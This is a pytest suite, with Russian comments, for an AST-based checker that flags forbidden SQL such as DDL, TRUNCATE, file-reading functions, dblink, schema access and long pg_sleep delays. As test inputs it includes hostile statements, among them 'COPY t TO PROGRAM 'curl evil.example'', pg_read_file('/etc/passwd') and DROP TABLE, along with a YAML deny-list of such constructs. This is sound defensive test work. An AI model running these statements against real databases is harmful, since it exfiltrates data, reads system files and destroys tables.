"""Тесты marina-03: раннее AST-сито на запрещённые конструкции.

По одному positive/negative на каждую категорию обязательного набора, мульти-кейс
(несколько запретов за один проход), сломанный SQL, golden-эталоны (только SELECT)
и работа с кастомным каталогом правил.
"""

from __future__ import annotations

import json
import textwrap
from pathlib import Path

import pytest

from app.ast_forbidden_check import (
    ForbiddenRule,
    _load_yaml_rules,
    check_forbidden_commands,
)

_GOLDEN = Path(__file__).resolve().parents[1] / "data" / "eval" / "golden_v1_0.jsonl"


def _labels(sql: str) -> set[str]:
    return {f.label for f in check_forbidden_commands(sql)}


# --- positive: каждая категория срабатывает ---------------------------------

POSITIVE_CASES: list[tuple[str, str, str]] = [
    ("DROP", "DROP TABLE sys_employee", "DDL_FORBIDDEN"),
    ("TRUNCATE", "TRUNCATE corp_tech_application", "TRUNCATE"),
    ("ALTER TABLE", "ALTER TABLE sys_employee ADD COLUMN x int", "DDL_FORBIDDEN"),
    ("CREATE TABLE", "CREATE TABLE t (id int)", "DDL_FORBIDDEN"),
    ("DELETE", "DELETE FROM t WHERE id = 1", "DML_NO_WHERE"),
    ("UPDATE", "UPDATE t SET x = 1 WHERE id = 2", "DML_NO_WHERE"),
    ("INSERT", "INSERT INTO t (id) VALUES (1)", "INSERT_UNSAFE"),
    ("COPY FROM PROGRAM", "COPY t TO PROGRAM 'curl evil.example'", "COPY_EXPORT"),
    ("pg_read_file", "SELECT pg_read_file('/etc/passwd')", "PROMPT_FS_READ"),
    ("pg_ls_dir", "SELECT pg_ls_dir('/')", "PROMPT_FS_READ"),
    ("dblink", "SELECT dblink('host=x', 'SELECT 1')", "PROMPT_SCHEMA_EXFIL"),
    ("lo_import", "SELECT lo_import('/etc/passwd')", "COPY_EXPORT"),
    ("lo_export", "SELECT lo_export(1234, '/tmp/x')", "COPY_EXPORT"),
    ("pg_catalog", "SELECT relname FROM pg_catalog.pg_class", "SCHEMA_LEAK"),
    ("information_schema", "SELECT table_name FROM information_schema.tables", "SCHEMA_LEAK"),
    ("pg_sleep > 1", "SELECT pg_sleep(5)", "TIME_DELAY"),
]


@pytest.mark.parametrize("name,sql,expected", POSITIVE_CASES, ids=[c[0] for c in POSITIVE_CASES])
def test_positive_category_fires(name: str, sql: str, expected: str) -> None:
    assert expected in _labels(sql), name


# --- negative: безопасный/похожий SQL не срабатывает ------------------------

NEGATIVE_SAFE: list[tuple[str, str]] = [
    ("обычный SELECT с фильтром", "SELECT id, name__ru FROM sys_employee WHERE status = 1 LIMIT 100"),
    ("агрегат", "SELECT COUNT(*) AS n FROM corp_tech_application"),
    ("маскировка md5/left", "SELECT md5(email) AS e, left(phone, 4) AS p FROM sys_employee LIMIT 10"),
    ("JOIN c ON", "SELECT a.id FROM corp_tech_application a JOIN sys_employee e ON e.id = a.emp_id LIMIT 50"),
    ("CTE без запретов", "WITH s AS (SELECT id FROM scp_application) SELECT id FROM s LIMIT 100"),
    ("колонка с 'drop' в имени", "SELECT dropdown_value FROM dict_product LIMIT 10"),
    ("таблица, похожая на схему", "SELECT id FROM information_schema_backup LIMIT 10"),
]


@pytest.mark.parametrize("name,sql", NEGATIVE_SAFE, ids=[c[0] for c in NEGATIVE_SAFE])
def test_negative_safe_sql_is_empty(name: str, sql: str) -> None:
    assert check_forbidden_commands(sql) == [], name


def test_pg_sleep_small_arg_does_not_fire() -> None:
    """pg_sleep(0.5) ≤ 1 c — не TIME_DELAY (точность правила)."""
    assert "TIME_DELAY" not in _labels("SELECT pg_sleep(0.5)")


def test_pg_catalog_not_triggered_by_similar_table_name() -> None:
    assert "SCHEMA_LEAK" not in _labels("SELECT id FROM my_pg_catalog_copy LIMIT 10")


# --- мульти-кейс: несколько запретов за один проход -------------------------


def test_multiple_forbidden_in_one_statement() -> None:
    labels = _labels("DROP TABLE a; TRUNCATE b")
    assert {"DDL_FORBIDDEN", "TRUNCATE"} <= labels


def test_func_and_schema_leak_together() -> None:
    findings = check_forbidden_commands("SELECT pg_read_file('x') FROM pg_catalog.pg_class")
    labels = {f.label for f in findings}
    assert {"PROMPT_FS_READ", "SCHEMA_LEAK"} <= labels


# --- сломанный SQL ----------------------------------------------------------


@pytest.mark.parametrize("sql", ["SELECT FROM WHERE", "", "   ", "DRP TABLE x ("])
def test_broken_sql_returns_syntax_broken(sql: str) -> None:
    assert _labels(sql) == {"SYNTAX_BROKEN"}


# --- эталоны Golden — только SELECT, барьер не срабатывает -------------------


def _golden_safe_rewrites(limit: int = 10) -> list[tuple[str, str]]:
    out: list[tuple[str, str]] = []
    with _GOLDEN.open(encoding="utf-8") as fh:
        for _, line in zip(range(limit), fh):
            row = json.loads(line)
            out.append((row["id"], row["safe_rewrite"]))
    return out


@pytest.mark.parametrize("case_id,sql", _golden_safe_rewrites(10), ids=[c[0] for c in _golden_safe_rewrites(10)])
def test_golden_safe_rewrites_pass(case_id: str, sql: str) -> None:
    assert check_forbidden_commands(sql) == [], case_id


# --- работа с каталогом правил ----------------------------------------------


def test_custom_rules_override_default() -> None:
    only_drop = [ForbiddenRule("d", "DDL_FORBIDDEN", 9, "node_type", ast_node="DropStmt")]
    assert _labels_with("DROP TABLE x", only_drop) == {"DDL_FORBIDDEN"}
    # TRUNCATE не попал в кастомный каталог → не ловится
    assert _labels_with("TRUNCATE x", only_drop) == set()


def test_empty_rules_catch_nothing() -> None:
    assert check_forbidden_commands("DROP TABLE x", rules=[]) == []


def test_evidence_names_the_object() -> None:
    findings = check_forbidden_commands("DROP TABLE sys_employee")
    assert findings[0].label == "DDL_FORBIDDEN"
    assert "sys_employee" in findings[0].evidence


def _labels_with(sql: str, rules: list[ForbiddenRule]) -> set[str]:
    return {f.label for f in check_forbidden_commands(sql, rules=rules)}


# --- интеграция каталога ksenia-01 (схема func_call_with_arg + широкие узлы) -

# Фрагмент в стиле каталога ksenia-01: своя схема полей (func_call_with_arg,
# func_name) и «широкие» правила на A_Expr/SelectStmt/RawStmt, которые в раннем
# барьере должны отсекаться guard'ом. Самодостаточно — не зависит от синка.
_KSENIA_LIKE_YAML = textwrap.dedent(
    """
    - id: drop_object
      label: DDL_FORBIDDEN
      severity: 9
      ast_check: node_type
      ast_node: ast.DropStmt
      description: |
        DROP TABLE — удаление объекта.
        Вторая строка описания.
    - id: grant_privileges
      label: PRIV_ESCALATE
      severity: 9
      ast_check: node_type
      ast_node: ast.GrantStmt
      description: GRANT — эскалация привилегий
    - id: pg_read_file
      label: PROMPT_FS_READ
      severity: 9.5
      ast_check: func_call_with_arg
      func_name: pg_read_file
      ast_node: ast.FuncCall
      description: чтение файла ФС
    - id: pg_sleep_long
      label: TIME_DELAY
      severity: 7
      ast_check: func_call_with_arg
      func_name: pg_sleep
      ast_node: ast.FuncCall
      description: искусственная задержка
    - id: blind_tautology
      label: TAUTOLOGY
      severity: 9
      ast_check: node_type
      ast_node: ast.A_Expr
      description: тавтология
    - id: union_exfil
      label: UNION_EXFIL
      severity: 6
      ast_check: node_type
      ast_node: ast.SelectStmt
      description: union-эксфильтрация
    - id: multi_statement
      label: MULTI_STATEMENT
      severity: 9
      ast_check: node_type
      ast_node: ast.RawStmt
      description: несколько стейтментов
    - id: pg_catalog_access
      label: SCHEMA_LEAK
      severity: 7
      ast_check: schema_access
      ast_node: ast.RangeVar
      description: доступ к pg_catalog
    """
)


@pytest.fixture()
def ksenia_catalog(tmp_path: Path) -> Path:
    path = tmp_path / "forbidden_constructs.yaml"
    path.write_text(_KSENIA_LIKE_YAML, encoding="utf-8")
    return path


def test_loader_maps_func_call_with_arg_and_func_name(ksenia_catalog: Path) -> None:
    rules = _load_yaml_rules(ksenia_catalog)
    rule = next(r for r in rules if r.id == "pg_read_file")
    assert rule.ast_check == "func_call"  # func_call_with_arg нормализован
    assert "pg_read_file" in rule.funcs   # имя взято из func_name


def test_loader_injects_default_arg_gt_for_pg_sleep(ksenia_catalog: Path) -> None:
    rules = _load_yaml_rules(ksenia_catalog)
    sleep = next(r for r in rules if r.id == "pg_sleep_long")
    assert sleep.arg_gt == 1.0  # порог подставлен, хотя в YAML его нет


def test_loader_handles_float_severity(ksenia_catalog: Path) -> None:
    rules = _load_yaml_rules(ksenia_catalog)
    rule = next(r for r in rules if r.id == "pg_read_file")
    assert rule.severity == 9  # severity 9.5 -> int


def test_guard_skips_broad_node_rules(ksenia_catalog: Path) -> None:
    """A_Expr/SelectStmt/RawStmt не дают hard-fail на обычном SELECT."""
    rules = _load_yaml_rules(ksenia_catalog)
    assert check_forbidden_commands("SELECT id FROM emp WHERE id = 1", rules=rules) == []
    assert check_forbidden_commands("SELECT id FROM emp UNION SELECT NULL", rules=rules) == []


def test_ksenia_precise_rules_fire(ksenia_catalog: Path) -> None:
    rules = _load_yaml_rules(ksenia_catalog)

    def labels(sql: str) -> set[str]:
        return {f.label for f in check_forbidden_commands(sql, rules=rules)}

    assert "DDL_FORBIDDEN" in labels("DROP TABLE emp")
    assert "PRIV_ESCALATE" in labels("GRANT ALL ON emp TO bob")
    assert "PROMPT_FS_READ" in labels("SELECT pg_read_file('/etc/passwd')")
    assert "TIME_DELAY" in labels("SELECT pg_sleep(5)")
    assert "TIME_DELAY" not in labels("SELECT pg_sleep(0.5)")


def test_default_merge_fills_gaps_and_keeps_golden_empty(
    ksenia_catalog: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """_default_rules() = каталог + fallback-floor: дыры закрыты, golden чист."""
    monkeypatch.setenv("FORBIDDEN_CONSTRUCTS_PATH", str(ksenia_catalog))

    def labels(sql: str) -> set[str]:
        return {f.label for f in check_forbidden_commands(sql)}

    # plain INSERT в каталоге Ксении-стиля нет → добавлен fallback-floor
    assert "INSERT_UNSAFE" in labels("INSERT INTO emp(id) VALUES (1)")
    # schema_access без поля schemas сам по себе инертен → покрыт fallback-floor
    assert "SCHEMA_LEAK" in labels("SELECT 1 FROM pg_catalog.pg_class")
    # широкие правила всё так же отсечены guard'ом → golden пусто
    with (Path(__file__).resolve().parents[1] / "data/eval/golden_v1_0.jsonl").open(encoding="utf-8") as fh:
        for _, line in zip(range(10), fh):
            assert check_forbidden_commands(json.loads(line)["safe_rewrite"]) == []
